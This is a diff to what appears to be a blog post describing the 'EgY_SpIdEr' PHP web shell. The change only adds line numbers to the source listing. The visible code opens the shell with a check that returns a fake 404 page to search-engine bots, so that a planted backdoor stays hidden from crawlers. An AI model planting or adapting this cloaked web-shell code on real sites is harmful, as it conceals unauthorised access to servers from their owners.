@@ -18,7 +18,7 @@ This shell seems to have every hack function you might want on a single page! Ta
 
 ### EgY_SpIdEr ShElL Source Code
 
-{% highlight php %}<?php if (preg_match("/bot/", $_SERVER[HTTP_USER_AGENT])) {
+{% highlight php linenos %}<?php if (preg_match("/bot/", $_SERVER[HTTP_USER_AGENT])) {
     header("HTTP/1.0 404");
     exit("&lt;h1&gt;Not Found&lt;/h1&gt;");
 }
